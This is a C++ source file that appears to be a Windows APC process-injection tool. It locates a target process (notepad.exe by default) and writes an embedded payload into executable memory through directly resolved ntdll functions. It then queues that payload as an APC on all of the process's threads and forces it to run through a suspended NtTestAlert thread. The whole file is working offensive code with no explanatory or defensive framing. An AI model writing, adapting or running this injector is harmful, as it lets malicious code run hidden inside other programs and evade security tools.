#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <string>
#include "payload/payload.h"

typedef LONG NTSTATUS;
typedef NTSTATUS (NTAPI* pNtAllocateVirtualMemory)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
typedef NTSTATUS (NTAPI* pNtWriteVirtualMemory)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
typedef NTSTATUS (NTAPI* pNtQueueApcThread)(HANDLE,PVOID,ULONG_PTR,ULONG_PTR,ULONG_PTR);

static DWORD pidByName(const std::wstring& name){ PROCESSENTRY32 pe{}; pe.dwSize=sizeof(pe); HANDLE s=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0); if(s==INVALID_HANDLE_VALUE) return 0; DWORD pid=0; if(Process32First(s,&pe)){ do{ if(!_wcsicmp(pe.szExeFile,name.c_str())){ pid=pe.th32ProcessID; break;} }while(Process32Next(s,&pe)); } CloseHandle(s); return pid; }
static int queueOnAll(HANDLE hp, DWORD pid, PVOID apcRoutine){ int q=0; THREADENTRY32 te{}; te.dwSize=sizeof(te); HANDLE s=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0); if(s==INVALID_HANDLE_VALUE) return 0; HMODULE ntdll=GetModuleHandleW(L"ntdll.dll"); if(!ntdll){ CloseHandle(s); return 0; } auto NtQueueApcThread=(pNtQueueApcThread)GetProcAddress(ntdll,"NtQueueApcThread"); if(!NtQueueApcThread){ CloseHandle(s); return 0; } if(Thread32First(s,&te)){ do{ if(te.th32OwnerProcessID==pid){ HANDLE ht=OpenThread(THREAD_SET_CONTEXT,FALSE,te.th32ThreadID); if(ht){ if(NtQueueApcThread(ht,apcRoutine,0,0,0)==0) q++; CloseHandle(ht);} } }while(Thread32Next(s,&te)); } CloseHandle(s); return q; }

int wmain(int argc, wchar_t* argv[]){ std::wstring target=argc>1?argv[1]:L"notepad.exe"; if(!g_DllPayload||g_DllPayloadSize==0){ printf("[-] No payload\n"); return 1; } DWORD pid=pidByName(target); if(pid==0){ printf("[-] Process not found\n"); return 1; } HANDLE hp=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid); if(!hp){ printf("[-] OpenProcess failed (%lu)\n",GetLastError()); return 1; }
 HMODULE ntdll=GetModuleHandleW(L"ntdll.dll"); if(!ntdll){ CloseHandle(hp); return 1; }
 auto NtAllocateVirtualMemory=(pNtAllocateVirtualMemory)GetProcAddress(ntdll,"NtAllocateVirtualMemory");
 auto NtWriteVirtualMemory=(pNtWriteVirtualMemory)GetProcAddress(ntdll,"NtWriteVirtualMemory");
 auto NtQueueApcThread=(pNtQueueApcThread)GetProcAddress(ntdll,"NtQueueApcThread");
 auto pNtTestAlert=(LPTHREAD_START_ROUTINE)GetProcAddress(ntdll,"NtTestAlert");
 if(!NtAllocateVirtualMemory||!NtWriteVirtualMemory||!NtQueueApcThread||!pNtTestAlert){ CloseHandle(hp); return 1; }
 PVOID remote=nullptr; SIZE_T sz=g_DllPayloadSize; NTSTATUS st=NtAllocateVirtualMemory(hp,&remote,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE); if(st!=0||!remote){ CloseHandle(hp); return 1; }
 SIZE_T written=0; st=NtWriteVirtualMemory(hp,remote,(PVOID)g_DllPayload,g_DllPayloadSize,&written); if(st!=0||written!=g_DllPayloadSize){ CloseHandle(hp); return 1; }
 int queued=queueOnAll(hp,pid,remote);
 HANDLE hSuspended=CreateRemoteThread(hp,nullptr,0,pNtTestAlert,nullptr,CREATE_SUSPENDED,nullptr); if(hSuspended){ if(NtQueueApcThread(hSuspended,remote,0,0,0)==0) queued++; ResumeThread(hSuspended); CloseHandle(hSuspended); }
 printf("[+] APC queued on %d threads\n", queued);
 CloseHandle(hp); return queued>0?0:1; }
